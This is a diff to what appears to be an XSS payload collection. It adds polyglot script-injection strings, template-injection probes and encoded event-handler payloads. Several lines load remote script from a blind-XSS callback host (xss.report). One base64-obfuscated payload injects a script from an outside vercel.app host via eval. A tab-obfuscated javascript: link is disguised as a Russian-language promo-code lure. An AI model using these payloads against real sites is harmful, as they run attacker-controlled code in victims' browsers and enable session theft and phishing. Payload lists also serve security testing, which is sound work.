@@ -1,8 +1,14 @@
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+${{<%[%'"}}%\
+"/test/></title/</script/</style/-->{{7*7}}<iframe/onload='alert``'<!--
+
 -->'">"></script><sCript/srC=//xss.report/c/someusername>
 
 -->'"/>%0a"><base href=//xss.report/c/someusername><script src='./'></script>
 
 */ /**/</style></script><script src="https://xss.report/c/someusername"></script>
+
+<img/src/onerror=alert(document.domain)>
 
 var script = document.createElement('script');
 script.type = 'text/javascript';
@@ -14,6 +20,9 @@ document.head.appendChild(script);
 &#60;img src=x onerror=alert()&#62;
 
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">ПРОМОКОД 70%</a>
+
+SS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
+
 
 &#60;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8vejAwLnZlcmNlbC5hcHAiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&#62;
 
